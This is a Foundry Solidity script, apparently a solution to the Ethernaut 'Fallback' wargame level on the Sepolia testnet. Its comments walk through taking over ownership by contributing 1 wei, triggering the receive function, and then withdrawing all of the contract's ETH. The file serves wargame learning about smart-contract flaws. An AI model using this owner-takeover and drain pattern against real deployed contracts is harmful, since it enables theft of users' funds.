// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Fallback} from "../src/Fallback.sol";

contract Exp is Script {
    // $ forge script script/FallbackExp.s.sol:Exp --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast -vvvvv
    // $ make fallbackExp ARGS='--network sepolia'
    Fallback public fallbackInstance = Fallback(payable(0x813aCfC55db8d05D1F80800F505c1402bbf76A6e)); // https://ethernaut.openzeppelin.com/ Get new instance address from Ethernaut

    function run() external {
        console.log("Owner:", fallbackInstance.owner());

        // ---- Attack Starts From here ---

        // - As you can see in the contract, we need to be the owner of the contract, to crack it.
        // - the contract has a `receive` function, so we can't send ETH to it.
        // - To be the new owner, the `receive` function checks the sender, sends ETH, and he is one of the contributors.
        // - We will fire `contribute` function, and send 1 wei, so we will be one of the contributors.
        // - Then we will send ETH to the `Fallback` contract (1 wei), since we are one of the contributors, we will path the check, and we will be the owner of the contract.
        // - We passed the first requirement and became the owners of the contract.
        // - We can simply call `withdraw` and take all `Fallback` ETH since we are the new owners.
        vm.startBroadcast();
        // fallbackInstance = new Fallback(); // Deploy a new instance of Fallback
        fallbackInstance.contribute{value: 1 wei}(); //send ether when interacting with an ABI
        (bool success,) = address(payable(fallbackInstance)).call{value: 1 wei}(""); //send ether outside of the ABI
        require(success, "Revert sending 1 wei to `fallbackInstance`");
        console.log("New Owner:", fallbackInstance.owner()); // We became the owners
        fallbackInstance.withdraw();
        vm.stopBroadcast();
    }
}
